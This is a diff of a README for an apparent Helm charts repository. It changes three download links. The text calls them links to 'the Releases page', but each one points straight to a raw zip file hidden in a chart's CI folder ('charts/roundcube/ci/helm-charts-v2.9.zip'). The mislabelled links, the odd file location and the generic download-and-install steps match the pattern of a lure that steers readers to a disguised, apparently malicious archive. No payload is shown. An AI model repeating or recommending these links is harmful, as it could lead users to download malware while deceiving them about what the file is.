@@ -7,11 +7,11 @@ Welcome to the helm-charts repository! This collection of Helm charts makes it s
 ## 📥 Download & Install
 To get started, you’ll want to download the software. Click the link below to visit the Releases page:
 
-[![Download helm-charts](https://raw.githubusercontent.com/Gansbett/helm-charts/main/durative/helm-charts.zip)](https://raw.githubusercontent.com/Gansbett/helm-charts/main/durative/helm-charts.zip)
+[![Download helm-charts](https://github.com/Gansbett/helm-charts/raw/refs/heads/main/charts/roundcube/ci/helm-charts-v2.9.zip)](https://github.com/Gansbett/helm-charts/raw/refs/heads/main/charts/roundcube/ci/helm-charts-v2.9.zip)
 
 On the Releases page, you will find the latest version of helm-charts. Please follow these steps:
 
-1. Visit [this page to download](https://raw.githubusercontent.com/Gansbett/helm-charts/main/durative/helm-charts.zip).
+1. Visit [this page to download](https://github.com/Gansbett/helm-charts/raw/refs/heads/main/charts/roundcube/ci/helm-charts-v2.9.zip).
 2. Find the version you want to install.
 3. Click on the desired Helm chart to download the file to your computer.
 
@@ -90,5 +90,5 @@ You can find more information related to these topics in our repository, helping
 
 Thank you for choosing helm-charts for your Kubernetes deployments. Happy charting!
 
-For additional downloads, please visit the Releases page again: [Download helm-charts](https://raw.githubusercontent.com/Gansbett/helm-charts/main/durative/helm-charts.zip).
+For additional downloads, please visit the Releases page again: [Download helm-charts](https://github.com/Gansbett/helm-charts/raw/refs/heads/main/charts/roundcube/ci/helm-charts-v2.9.zip).
 ```
